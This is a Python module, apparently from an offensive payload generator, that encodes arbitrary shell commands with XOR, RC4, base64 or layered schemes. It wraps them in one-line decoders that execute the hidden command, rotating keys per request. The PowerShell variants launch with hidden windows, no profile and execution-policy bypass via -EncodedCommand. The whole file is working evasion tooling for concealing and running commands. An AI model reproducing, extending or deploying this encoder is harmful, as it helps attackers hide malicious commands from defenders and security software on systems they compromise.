"""
Post-generation payload encoding with per-request key rotation.
All decode envelopes are self-contained one-liners — no external key files.
"""
import base64
import os
import random

from .obfuscate import bash_base64_pipe

SUPPORTED_TECHNIQUES = ("xor", "rc4", "b64", "layered")

_PS_FAMILIES = {"powershell", "ps"}


def _random_xor_key() -> int:
    return random.randint(1, 255)


def _random_rc4_key(length: int = 16) -> bytes:
    return os.urandom(length)


def _xor_bytes(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)


def _rc4(data: bytes, key: bytes) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    i = j = 0
    out = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        out.append(byte ^ s[(s[i] + s[j]) % 256])
    return bytes(out)


# ── bash / unix envelopes ──────────────────────────────────────────────────────

def _bash_xor_envelope(cmd: str, key: int) -> tuple[str, str]:
    encoded = base64.b64encode(_xor_bytes(cmd.encode(), key)).decode()
    key_hex = f"{key:02x}"
    envelope = (
        f"python3 -c 'import base64;"
        f"d=base64.b64decode(\"{encoded}\");"
        f"exec(bytes([b^0x{key_hex} for b in d]).decode())'"
    )
    return envelope, key_hex


def _bash_rc4_envelope(cmd: str, key: bytes) -> tuple[str, str]:
    encoded = base64.b64encode(_rc4(cmd.encode(), key)).decode()
    key_hex = key.hex()
    key_list = ",".join(str(b) for b in key)
    envelope = (
        f"python3 -c '"
        f"import base64;"
        f"d=base64.b64decode(\"{encoded}\");"
        f"k=bytes([{key_list}]);"
        f"s=list(range(256));j=0\n"
        f"for i in range(256):j=(j+s[i]+k[i%len(k)])%256;s[i],s[j]=s[j],s[i]\n"
        f"i=j=0;o=[]\n"
        f"for b in d:i=(i+1)%256;j=(j+s[i])%256;s[i],s[j]=s[j],s[i];o.append(b^s[(s[i]+s[j])%256])\n"
        f"exec(bytes(o).decode())'"
    )
    return envelope, key_hex


def _bash_b64_envelope(cmd: str) -> tuple[str, str]:
    return bash_base64_pipe(cmd), ""


def _bash_layered_envelope(cmd: str) -> tuple[str, str]:
    xor_key = _random_xor_key()
    xor_enc = base64.b64encode(_xor_bytes(cmd.encode(), xor_key)).decode()
    b64_of_xor = base64.b64encode(xor_enc.encode()).decode()
    key_hex = f"{xor_key:02x}"
    envelope = (
        f"python3 -c 'import base64;"
        f"x=base64.b64decode(\"{b64_of_xor}\").decode();"
        f"d=base64.b64decode(x);"
        f"exec(bytes([b^0x{key_hex} for b in d]).decode())'"
    )
    return envelope, key_hex


# ── PowerShell envelopes ───────────────────────────────────────────────────────

def _ps_xor_envelope(cmd: str, key: int) -> tuple[str, str]:
    encoded = base64.b64encode(_xor_bytes(cmd.encode(), key)).decode()
    key_hex = f"{key:02x}"
    # Use cmd.exe /c to launch python3 for decode (works on Windows with Python in PATH)
    envelope = (
        f'cmd.exe /c python3 -c "'
        f"import base64;"
        f"d=base64.b64decode('{encoded}');"
        f"exec(bytes([b^0x{key_hex} for b in d]).decode())"
        f'"'
    )
    return envelope, key_hex


def _ps_rc4_envelope(cmd: str, key: bytes) -> tuple[str, str]:
    encoded = base64.b64encode(_rc4(cmd.encode(), key)).decode()
    key_hex = key.hex()
    key_list = ",".join(str(b) for b in key)
    ps_code = (
        f"$d=[Convert]::FromBase64String('{encoded}');"
        f"$k=[byte[]]@({key_list});"
        f"$s=0..255;$j=0;"
        f"0..255|%{{$t=$s[$_];$j=($j+$t+$k[$_%$k.Length])%256;$s[$_]=$s[$j];$s[$j]=$t}};"
        f"$i=0;$j=0;$o=@();"
        f"$d|%{{$i=($i+1)%256;$j=($j+$s[$i])%256;$t=$s[$i];$s[$i]=$s[$j];$s[$j]=$t;"
        f"$o+=$_-bxor$s[($s[$i]+$s[$j])%256]}};"
        f"[ScriptBlock]::Create([Text.Encoding]::UTF8.GetString($o)).Invoke()"
    )
    b64 = base64.b64encode(ps_code.encode("utf-16-le")).decode()
    return f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64}", key_hex


def _ps_b64_envelope(cmd: str) -> tuple[str, str]:
    b64 = base64.b64encode(cmd.encode("utf-16-le")).decode()
    return f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64}", ""


# ── Public API ─────────────────────────────────────────────────────────────────

def encode_command(cmd: str, technique: str, language: str) -> tuple[str, str]:
    """
    Encode a shell command using the given technique.

    Returns (encoded_cmd, key_hex) — key_hex is empty string when not applicable.
    language is used to select the appropriate decode envelope (PS vs unix).
    """
    is_ps = language.lower() in _PS_FAMILIES

    if technique == "xor":
        key = _random_xor_key()
        if is_ps:
            return _ps_xor_envelope(cmd, key)
        return _bash_xor_envelope(cmd, key)

    if technique == "rc4":
        key = _random_rc4_key()
        if is_ps:
            return _ps_rc4_envelope(cmd, key)
        return _bash_rc4_envelope(cmd, key)

    if technique == "b64":
        if is_ps:
            if "-EncodedCommand" in cmd:
                return cmd, ""
            return _ps_b64_envelope(cmd)
        return _bash_b64_envelope(cmd)

    if technique == "layered":
        if is_ps:
            key = _random_rc4_key()
            return _ps_rc4_envelope(cmd, key)
        return _bash_layered_envelope(cmd)

    raise ValueError(f"Unknown encode technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
